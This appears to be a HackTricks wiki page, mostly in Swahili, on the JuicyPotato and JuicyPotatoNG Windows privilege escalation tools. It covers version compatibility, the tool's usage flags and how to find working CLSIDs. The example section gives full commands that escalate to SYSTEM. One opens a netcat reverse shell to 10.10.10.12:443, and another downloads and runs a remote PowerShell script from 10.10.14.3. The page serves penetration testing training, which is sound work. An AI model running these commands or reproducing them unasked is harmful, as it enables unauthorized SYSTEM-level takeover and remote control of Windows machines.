# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato ni ya zama. Kwa ujumla inafanya kazi kwenye matoleo ya Windows hadi Windows 10 1803 / Windows Server 2016. Mabadiliko ya Microsoft yaliyoanza kuingia katika Windows 10 1809 / Server 2019 yalivunja mbinu asilia. Kwa matoleo hayo na mapya zaidi, fikiria mbadala za kisasa kama PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato na wengine. Tazama ukurasa hapo chini kwa chaguzi na matumizi za kisasa.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (kudhulumu vibali vya dhahabu) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- Inafanya kazi kwa kuaminika hadi Windows 10 1803 na Windows Server 2016 wakati muktadha wa sasa una SeImpersonatePrivilege au SeAssignPrimaryTokenPrivilege.
- Imevunjwa na hardening ya Microsoft katika Windows 10 1809 / Windows Server 2019 na baadaye. Tumia mbadala zilizo kwenye link hapo juu kwa matoleo hayo na mapya.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

Tuligundua kuwa, mbali na `BITS`, kuna servere kadhaa za COM tunaweza kuzitumia vibaya. Zinahitaji tu:

1. kuzinduliwa na mtumiaji wa sasa, kawaida “service user” ambaye ana impersonation privileges
2. kutekeleza interface ya `IMarshal`
3. kukimbia kama mtumiaji mwenye viwango vya juu (SYSTEM, Administrator, …)

Baada ya majaribio tulipata na kujaribu orodha ndefu ya [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) kwenye matoleo mbalimbali ya Windows.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato inakuwezesha:

- **Target CLSID** _chagua CLSID yoyote unayotaka._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _unaweza kupata orodha iliyopangwa kwa OS._
- **COM Listening port** _taja COM listening port unayopendeleo (badala ya marshalled hardcoded 6666)_
- **COM Listening IP address** _weke server kusikiliza kwenye IP yoyote_
- **Process creation mode** _kutegemea vibali vya mtumiaji aliyefanyakwa impersonation unaweza kuchagua kutoka:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _anzisha executable au script ikiwa the exploitation itafanikiwa_
- **Process Argument** _rekebisha vigezo vya process iliyozinduliwa_
- **RPC Server address** _kwa njia ya kimyadariko unaweza ku-authenticate kwenye RPC server ya nje_
- **RPC Server port** _inayofaa ikiwa unataka ku-authenticate kwenye server ya nje na firewall inazuia bandari `135`…_
- **TEST mode** _hasa kwa madhumuni ya kujaribu, yaani kujaribu CLSIDs. Inaunda DCOM na inachapisha mtumiaji wa token. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Ikiwa mtumiaji ana vibali vya `SeImpersonate` au `SeAssignPrimaryToken` basi wewe ni **SYSTEM**.

Karibu haiwezekani kuzuia matumizi mabaya ya COM Servers zote hizi. Unaweza kufikiria kubadilisha ruhusa za vitu hivi kupitia `DCOMCNFG`, lakini bahati nzuri — hii itakuwa changamoto.

Suluhisho halisi ni kulinda akaunti na programu nyeti ambazo zinaendesha chini ya akaunti za `* SERVICE`. Kusimamisha `DCOM` hakika kutazuia exploit hii lakini kunaweza kuwa na athari kubwa kwa OS ya msingi.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG inarejelea mbinu ya JuicyPotato-style ya local privilege escalation kwenye Windows ya kisasa kwa kuunganisha:
- DCOM OXID resolution kwa local RPC server kwenye port iliyochaguliwa, ikiepuka listener ya zamani iliyowekwa 127.0.0.1:6666.
- SSPI hook ya kushika na kuiga uthibitisho wa SYSTEM unaoingia bila kuhitaji RpcImpersonateClient, ambayo pia inawezesha CreateProcessAsUser wakati SeAssignPrimaryTokenPrivilege peke yake ipo.
- Mbinu za kukidhi vizingiti vya uanzishaji vya DCOM (mf., sharti la zamani la INTERACTIVE-group wakati ukilenga PrintNotify / ActiveX Installer Service classes).

Important notes (evolving behavior across builds):
- Septemba 2022: Mbinu ya awali ilifanya kazi kwenye malengo ya Windows 10/11 na Server zilizoungwa mkono ikitumia “INTERACTIVE trick”.
- Januari 2023: Sasisho kutoka kwa waandishi: Microsoft baadaye ilizuia INTERACTIVE trick. CLSID tofauti ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) inarejesha exploitation lakini tu kwenye Windows 11 / Server 2022 kulingana na chapisho lao.

Matumizi ya msingi (bendera zaidi ziko kwenye msaada):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Ikiwa unalenga Windows 10 1809 / Server 2019 ambapo JuicyPotato ya kawaida imepachikwa, pendelea mbadala zilizo kwenye sehemu ya juu (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG inaweza kuwa ya mazingira kulingana na build na hali ya huduma.

## Mifano

Kumbuka: Tembelea [this page](https://ohpe.it/juicy-potato/CLSID/) kwa orodha ya CLSIDs za kujaribu.

### Pata nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Anzisha CMD mpya (ikiwa una ufikiaji wa RDP)

![](<../../images/image (300).png>)

## Matatizo ya CLSID

Mara nyingi, CLSID chaguo-msingi ambayo JuicyPotato inatumia **haifanyi kazi** na exploit inashindwa. Kwa kawaida, inahitaji majaribio kadhaa ili kupata **CLSID inayofanya kazi**. Ili kupata orodha ya CLSID za kujaribu kwa mfumo wa uendeshaji maalum, tembelea ukurasa huu:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Kuangalia CLSIDs**

Kwanza, utahitaji baadhi ya faili za programu mbali na juicypotato.exe.

Pakua [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) na uiload kwenye kikao chako cha PS, na pakua na uendeshe [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Skripti hiyo itaunda orodha ya CLSID zinazowezekana za kujaribu.

Kisha pakua [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(badilisha njia kwa orodha ya CLSID na kwa juicypotato executable) na uiiendeshe. Itaanza kujaribu kila CLSID, na **wakati nambari ya bandari inabadilika, itamaanisha kuwa CLSID ilifanya kazi**.

**Angalia** CLSID zinazofanya kazi **ukitumia parameter -c**

## Marejeo

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
